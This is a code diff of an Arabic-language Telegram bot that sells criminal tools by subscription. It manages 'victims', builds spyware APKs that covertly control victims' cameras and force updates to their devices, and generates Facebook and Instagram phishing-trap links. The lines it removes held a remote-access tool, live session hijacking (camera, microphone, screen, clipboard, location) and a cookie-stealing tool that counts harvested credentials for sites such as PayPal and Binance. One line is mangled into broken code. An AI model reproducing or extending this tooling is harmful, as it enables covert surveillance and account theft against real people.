@@ -1,7 +1,7 @@
 # bot_handlers.py
 # ============================================================
 # معالجات البوت الرئيسية: /start + callback + step handlers
-# v5 — مع Web Dashboard + APK Manager + Auto-Update
+# v7 — بعد حذف RAT / QR / LSH / SH
 # ============================================================
 
 import io
@@ -34,11 +34,6 @@ from imports_manager import (
     create_victim, get_victim, get_all_victims, delete_victim,
     update_victim_status, rename_victim,
     queue_victim_command,
-    # LSH
-    lsh_push_command,
-    # QR / RAT
-    generate_qr_code_bytes, lsh_generate_qr,
-    queue_command,
     # APK Manager
     build_apk_panel, push_apk_command,
 )
@@ -57,12 +52,6 @@ def h(text):
     if text is None:
         return ""
     return html.escape(str(text))
-
-
-# ============================================================
-# متغيرات عامة
-# ============================================================
-_pending_open_url = {}
 
 
 # ============================================================
@@ -93,31 +82,35 @@ except ImportError:
 # القوائم
 # ============================================================
 def main_menu(user_id=None):
+    """القائمة الرئيسية — بعد حذف 4 أدوات"""
     markup = InlineKeyboardMarkup()
     markup.add(InlineKeyboardButton("👥 إدارة الضحايا", callback_data="v_list"))
     markup.add(InlineKeyboardButton("📱 تطبيق الضحية (APK)", callback_data="v_new"))
 
-    # 🌐 زر لوحة التحكم الويب
+    # 🌐 لوحة التحكم الويب
     markup.add(InlineKeyboardButton(
         "🌐 لوحة التحكم (ويب)",
         callback_data="open_dashboard"
     ))
 
+    # الروابط والمصائد
     markup.add(InlineKeyboardButton("🔗 توليد رابط مصيدة فيسبوك", callback_data="gen_fb"))
     markup.add(InlineKeyboardButton("📸 توليد رابط مصيدة انستقرام", callback_data="gen_ig"))
-    markup.add(InlineKeyboardButton("📱 أداة المراقبة والتحكم الخلفي", callback_data="gen_rat"))
-    markup.add(InlineKeyboardButton("📷 أداة ربط الضحية السريع عبر QR", callback_data="gen_qr"))
-    markup.add(InlineKeyboardButton("🕹️ السيطرة الكاملة على الجلسة (LSH)", callback_data="gen_lsh"))
-    markup.add(InlineKeyboardButton("🍪 سرقة الكوكيز والجلسات (SH)", callback_data="gen_sh"))
+
+    # ← الأماكن الجديدة للأدوات القادمة
+
+    # الاشتراكات
     markup.add(InlineKeyboardButton("💎 الاشتراكات والدفع", callback_data="payment_menu"))
     markup.add(InlineKeyboardButton("👤 حسابي", callback_data="my_account"))
+
     if user_id and is_admin(user_id):
         markup.add(InlineKeyboardButton("👑 لوحة تحكم الأدمن", callback_data="admin_panel"))
+
     return markup
 
 
 def victim_commands_panel(victim_id):
-    """لوحة التحكم الكاملة بالضحية — مع كل الأوامر"""
+    """لوحة التحكم الكاملة بالضحية"""
     m = InlineKeyboardMarkup()
 
     # ═══════ الكاميرا ═══════
@@ -223,7 +216,7 @@ def victim_commands_panel(victim_id):
 
 
 # ============================================================
-# ★★★ لوحة التحديث الأمنية (جديدة) ★★★
+# لوحة التحديث
 # ============================================================
 def build_update_panel():
     """لوحة التحكم في التحديثات"""
@@ -249,19 +242,16 @@ def build_update_panel():
 
 
 # ============================================================
-# ★★★ دوال التحديث ★★★
+# دوال التحديث
 # ============================================================
 def get_update_status_text():
     """يجيب نص حالة التحديث"""
     try:
-        # معلومات النسخة الحالية
         version_code = CURRENT_VERSION_CODE
         version_name = CURRENT_VERSION_NAME
 
-        # آخر release
         latest = _get_cached_apk_info() or _find_latest_apk_release()
 
-        # عدد الضحايا
         total_victims = 0
         if redis_client:
             try:
@@ -270,7 +260,6 @@ def get_update_status_text():
             except Exception:
                 pass
 
-        # إحصائيات التحديثات
         update_success = 0
         update_failed = 0
         if redis_client:
@@ -280,7 +269,6 @@ def get_update_status_text():
             except Exception:
                 pass
 
-        # Force update flag
         force_active = False
         if redis_client:
             try:
@@ -420,8 +408,7 @@ def dashboard_command(message):
             "💡 <b>يحتوي على:</b>\n"
             "• قائمة ضحاياك مع الحالة\n"
             "• إرسال أوامر مباشرة\n"
-            "• إحصائيات مفصلة\n"
-            "• جلسات LSH النشطة",
+            "• إحصائيات مفصلة",
             parse_mode="HTML",
             reply_markup=markup
         )
@@ -433,7 +420,7 @@ def dashboard_command(message):
 
 
 # ============================================================
-# ★★★ /update — أوامر التحديث السريعة ★★★
+# /update
 # ============================================================
 @bot.message_handler(commands=['update', 'updates', 'update_panel'])
 def update_command(message):
@@ -509,8 +496,7 @@ def _handle_callback(call, chat_id, user_id, data):
                 "💡 <b>يحتوي على:</b>\n"
                 "• قائمة ضحاياك مع الحالة\n"
                 "• إرسال أوامر مباشرة\n"
-                "• إحصائيات مفصلة\n"
-                "• جلسات LSH النشطة",
+                "• إحصائيات مفصلة",
                 parse_mode="HTML",
                 reply_markup=markup
             )
@@ -523,7 +509,7 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     # ============================================================
-    # ★★★ أوامر التحديث (upd_) ★★★
+    # أوامر التحديث (upd_)
     # ============================================================
     if data == "upd_status":
         if not is_admin(user_id):
@@ -572,7 +558,6 @@ def _handle_callback(call, chat_id, user_id, data):
             bot.answer_callback_query(call.id, "❌", show_alert=True)
             return
 
-        # تأكيد
         m = InlineKeyboardMarkup()
         m.row(
             InlineKeyboardButton("✅ نعم، شغّل التحديث الشامل", callback_data="upd_force_all_confirm"),
@@ -602,10 +587,8 @@ def _handle_callback(call, chat_id, user_id, data):
 
         try:
             if redis_client:
-                # اضبط flag لمدة ساعة
                 redis_client.setex("apk_force_update", 3600, str(int(time.time())))
 
-                # زوّد عدّاد الضحايا
                 victims = 0
                 try:
                     victims = len(redis_client.keys("victim:*") or [])
@@ -661,7 +644,6 @@ def _handle_callback(call, chat_id, user_id, data):
             if redis_client:
                 redis_client.delete("apk_current_info")
 
-                # امسح ملفات الـ cache
                 import os
                 import shutil
                 cache_dir = os.getenv("APK_CACHE_DIR", "/tmp/apk_cache")
@@ -696,7 +678,6 @@ def _handle_callback(call, chat_id, user_id, data):
                 bot.send_message(chat_id, "❌ Redis غير متصل")
                 return
 
-            # اقرأ سجل التحديثات
             history_raw = redis_client.lrange("update_history", 0, 19) or []
 
             if not history_raw:
@@ -1097,60 +1078,6 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     # ============================================================
-    # اختيار موقع الضحية (بعد إدخال الاسم)
-    # ============================================================
-    if data.startswith("victim_site_"):
-        site = data.replace("victim_site_", "")
-        bot.answer_callback_query(call.id, "⏳ جاري التجهيز...")
-
-        pending_name = None
-        if redis_client:
-            try:
-                pending_name = redis_client.get(f"pending_victim_name:{chat_id}")
-                if pending_name:
-                    redis_client.delete(f"pending_victim_name:{chat_id}")
-            except Exception as e:
-                logger.warning(f"redis get pending_victim_name error: {e}")
-
-        if not pending_name:
-            bot.send_message(chat_id, "❌ انتهت صلاحية العملية، ابدأ من جديد")
-            return
-
-        wait_msg = bot.send_message(
-            chat_id,
-            f"⏳ <b>جاري تجهيز APK لـ</b> <code>{h(pending_name)}</code>\n\n"
-            f"🎯 الموقع: <code>{h(site)}</code>\n\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"🔨 <i>بناء التطبيق في GitHub Actions</i>\n"
-            f"⏱️ <i>الوقت المتوقع: 2-4 دقائق</i>",
-            parse_mode="HTML"
-        )
-
-        victim = create_victim(chat_id, pending_name, site)
-
-        if not victim:
-            try:
-                bot.edit_message_text(
-                    "❌ فشل إنشاء الضحية",
-                    chat_id=chat_id, message_id=wait_msg.message_id
-                )
-            except Exception as e:
-                logger.warning(f"edit_message_text error: {e}")
-            return
-
-        victim_token = victim.get("victim_token")
-        victim_id = victim.get("victim_id")
-
-        logger.info(f"Victim created: {pending_name} | site={site} | {victim_id}")
-
-        threading.Thread(
-            target=_build_and_send_apk,
-            args=(chat_id, pending_name, victim_token, wait_msg.message_id),
-            daemon=True
-        ).start()
-        return
-
-    # ============================================================
     # تحديث / إعادة تسمية / حذف
     # ============================================================
     if data.startswith("v_refresh_"):
@@ -1248,7 +1175,6 @@ def _handle_callback(call, chat_id, user_id, data):
                          reply_markup=build_admin_menu(), parse_mode="HTML")
         return
 
-    # ★ زر التحديثات السريع في لوحة الأدمن
     if data == "admin_updates":
         if not is_admin(user_id):
             bot.answer_callback_query(call.id, "❌", show_alert=True)
@@ -1464,9 +1390,7 @@ def _handle_callback(call, chat_id, user_id, data):
         bot.answer_callback_query(call.id)
         msg = bot.send_message(chat_id, "💎 <b>أرسل ID لمنح VIP:</b>", parse_mode="HTML")
         bot.register_next_step_handler(msg, admin_grant_vip_handler)
-        return
-
-    if data == "admin_give_stars":
+        return    if data == "admin_give_stars":
         if not is_admin(user_id): return
         bot.answer_callback_query(call.id)
         msg = bot.send_message(chat_id, "⭐ <b>أرسل:</b> <code>user_id|amount</code>", parse_mode="HTML")
@@ -1517,211 +1441,6 @@ def _handle_callback(call, chat_id, user_id, data):
         return
 
     # ============================================================
-    # RAT
-    # ============================================================
-    if data == "gen_rat":
-        check = can_use_tool(chat_id, "rat")
-        if not check["allowed"]:
-            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "rat", check),
-                             parse_mode="HTML")
-            return
-        consume_usage(chat_id, "rat")
-        bot.answer_callback_query(call.id, "جاري التجهيز...")
-        link = f"{PUBLIC_URL}/system_secure_v2?id={chat_id}"
-        bot.send_message(chat_id, f"📱 رابط RAT:\n<code>{h(link)}</code>", parse_mode="HTML")
-        return
-
-    # ============================================================
-    # QR
-    # ============================================================
-    if data == "gen_qr":
-        check = can_use_tool(chat_id, "qr")
-        if not check["allowed"]:
-            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "qr", check),
-                             parse_mode="HTML")
-            return
-        consume_usage(chat_id, "qr")
-        bot.answer_callback_query(call.id, "جاري التجهيز...")
-        token = str(uuid.uuid4())[:8]
-        if redis_client:
-            try:
-                redis_client.setex(f"qr_token:{token}", 300, chat_id)
-            except Exception as e:
-                logger.warning(f"redis setex qr_token error: {e}")
-        target_link = f"{PUBLIC_URL}/qr_scan_target?token={token}"
-        qr_image = generate_qr_code_bytes(target_link)
-        if qr_image:
-            qr_image.name = 'pairing_qr.jpg'
-            bot.send_photo(chat_id, qr_image,
-                           caption="📷 <b>امسح الـ QR:</b>", parse_mode="HTML")
-        else:
-            bot.send_message(chat_id, f"🎯 رابط QR:\n<code>{h(target_link)}</code>", parse_mode="HTML")
-        return
-
-    # ============================================================
-    # LSH
-    # ============================================================
-    if data == "gen_lsh":
-        check = can_use_tool(chat_id, "lsh")
-        if not check["allowed"]:
-            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "lsh", check),
-                             parse_mode="HTML")
-            return
-        consume_usage(chat_id, "lsh")
-        bot.answer_callback_query(call.id, "جاري التجهيز...")
-        session_id = str(uuid.uuid4()).replace('-', '')[:24]
-        if redis_client:
-            try:
-                redis_client.setex(f"lsh_session:{session_id}", 86400, str(chat_id))
-            except Exception as e:
-                logger.warning(f"redis setex lsh_session error: {e}")
-        try:
-            requests.post(f"{PUBLIC_URL}/lsh_create",
-                          json={"chat_id": chat_id, "session_id": session_id}, timeout=5)
-        except Exception as e:
-            logger.warning(f"lsh_create POST error: {e}")
-        target_link = f"{PUBLIC_URL}/lsh?s={session_id}&id={chat_id}"
-        qr_image = lsh_generate_qr(target_link)
-        if qr_image:
-            qr_image.name = 'lsh_qr.png'
-            try:
-                bot.send_photo(chat_id, qr_image,
-                               caption=f"🕹️ <b>جلسة LSH جاهزة!</b>\n<code>{h(target_link)}</code>",
-                               parse_mode="HTML")
-            except Exception:
-                bot.send_message(chat_id, f"🕹️ <code>{h(target_link)}</code>", parse_mode="HTML")
-        else:
-            bot.send_message(chat_id, f"🕹️ <code>{h(target_link)}</code>", parse_mode="HTML")
-        return
-
-    # ============================================================
-    # Session Hunter
-    # ============================================================
-    if data == "gen_sh":
-        check = can_use_tool(chat_id, "sh")
-        if not check["allowed"]:
-            bot.answer_callback_query(call.id, "❌ لا يوجد رصيد", show_alert=True)
-            bot.send_message(chat_id, _deny_message(check["reason"], chat_id, "sh", check),
-                             parse_mode="HTML")
-            return
-        bot.answer_callback_query(call.id)
-
-        victims = get_all_victims(chat_id)
-        markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("➕ ضحية جديدة", callback_data="victim_new"))
-
-        if victims:
-            markup.add(InlineKeyboardButton(
-                f"━━━ 📋 الضحايا ({len(victims)}) ━━━",
-                callback_data="noop"
-            ))
-            for v in victims[:12]:
-                name = v.get("name", "غير معروف")[:18]
-                site = v.get("site", "facebook")
-                creds = int(v.get("creds_count", 0))
-                icon = "✅" if creds > 0 else ("⏳" if v.get("status") == "active" else "⏸️")
-                site_icon = {
-                    "facebook": "📘", "instagram": "📷", "tiktok": "🎵",
-                    "twitter": "🐦", "gmail": "📧", "snapchat": "👻",
-                    "linkedin": "💼", "discord": "🎮", "telegram": "✈️",
-                    "netflix": "🎬", "paypal": "💳", "binance": "💰",
-                }.get(site, "🌐")
-                vid = v.get("victim_id", "")
-                markup.add(InlineKeyboardButton(
-                    f"{icon} {name} — {site_icon} ({creds} 📥)",
-                    callback_data=f"victim_{vid}"
-                ))
-
-        bot.send_message(
-            chat_id,
-            f"👥 <b>نظام إدارة الضحايا</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"📊 <b>عدد الضحايا:</b> <code>{len(victims)}</code>\n\n"
-            f"اختر ضحية أو أضف جديدة:",
-            reply_markup=markup, parse_mode="HTML"
-        )
-        return
-
-    if data == "victim_new":
-        bot.answer_callback_query(call.id)
-        msg = bot.send_message(
-            chat_id,
-            "📝 <b>أرسل اسم الضحية:</b>\n\nمثال: <code>أحمد</code>",
-            parse_mode="HTML"
-        )
-        bot.register_next_step_handler(msg, victim_name_handler)
-        return
-
-    # ============================================================
-    # RAT أوامر
-    # ============================================================
-    if data.startswith("rat_cam_"):
-        target_chat_id = data.replace("rat_cam_", "")
-        queue_command(target_chat_id, "snapshot")
-        bot.answer_callback_query(call.id, "⏳ جاري التقاط الصورة...")
-        return
-
-    if data.startswith("rat_mic_"):
-        target_chat_id = data.replace("rat_mic_", "")
-        queue_command(target_chat_id, "audio")
-        bot.answer_callback_query(call.id, "⏳ جاري التسجيل...")
-        return
-
-    # ============================================================
-    # LSH أوامر
-    # ============================================================
-    if data.startswith("lsh_snap_"):
-        sid = data.replace("lsh_snap_", "")
-        ok = lsh_push_command(sid, {"action": "snapshot"})
-        bot.answer_callback_query(call.id, "📸" if ok else "❌", show_alert=not ok)
-        return
-
-    if data.startswith("lsh_audio_"):
-        sid = data.replace("lsh_audio_", "")
-        ok = lsh_push_command(sid, {"action": "audio", "payload": {"duration": 6000}})
-        bot.answer_callback_query(call.id, "🎙️" if ok else "❌", show_alert=not ok)
-        return
-
-    if data.startswith("lsh_video_"):
-        sid = data.replace("lsh_video_", "")
-        ok = lsh_push_command(sid, {"action": "video", "payload": {"duration": 10000}})
-        bot.answer_callback_query(call.id, "🎥" if ok else "❌", show_alert=not ok)
-        return
-
-    if data.startswith("lsh_screen_"):
-        sid = data.replace("lsh_screen_", "")
-        ok = lsh_push_command(sid, {"action": "screen"})
-        bot.answer_callback_query(call.id, "🖥️" if ok else "❌", show_alert=not ok)
-        return
-
-    if data.startswith("lsh_clip_"):
-        sid = data.replace("lsh_clip_", "")
-        ok = lsh_push_command(sid, {"action": "clipboard"})
-        bot.answer_callback_query(call.id, "📋" if ok else "❌", show_alert=not ok)
-        return
-
-    if data.startswith("lsh_loc_"):
-        sid = data.replace("lsh_loc_", "")
-        ok = lsh_push_command(sid, {"action": "location"})
-        bot.answer_callback_query(call.id, "📍" if ok else "❌", show_alert=not ok)
-        return
-
-    if data.startswith("lsh_vibrate_"):
-        sid = data.replace("lsh_vibrate_", "")
-        ok = lsh_push_command(sid, {"action": "vibrate", "payload": {"pattern": [500, 200, 500]}})
-        bot.answer_callback_query(call.id, "📳" if ok else "❌", show_alert=not ok)
-        return
-
-    if data.startswith("lsh_kill_"):
-        sid = data.replace("lsh_kill_", "")
-        ok = lsh_push_command(sid, {"action": "redirect", "payload": {"url": "about:blank"}})
-        bot.answer_callback_query(call.id, "❌", show_alert=not ok)
-        return
-
-    # ============================================================
     # Unknown callback
     # ============================================================
     logger.warning(f"Unhandled callback: {data}")
@@ -1743,12 +1462,10 @@ def upd_target_handler(message):
     target = message.text.strip()
 
     try:
-        # ابحث عن الضحية بـ token أو device_id
         found_victim = None
         found_victim_id = None
 
         if redis_client:
-            # ابحث بـ victim_token
             token_key = f"victim_token:{target}"
             raw = redis_client.get(token_key)
             if raw:
@@ -1757,7 +1474,6 @@ def upd_target_handler(message):
                 found_victim_id = info.get("victim_id")
                 found_victim = info
 
-            # أو ابحث في كل الضحايا
             if not found_victim_id:
                 keys = redis_client.keys("victim:*:*")
                 for key in keys[:200]:
@@ -1779,7 +1495,6 @@ def upd_target_handler(message):
             )
             return
 
-        # اضبط flag خاص بالضحية
         if redis_client:
             redis_client.setex(
                 f"apk_force_update:{found_victim_id}",
@@ -2005,6 +1720,7 @@ def v_rename_step(message, victim_id):
 
 
 def victim_name_handler(message):
+    """لـ Session Hunter القديم - محتفظ بها للتوافق"""
     if not message.text:
         return
     name = message.text.strip()[:50]
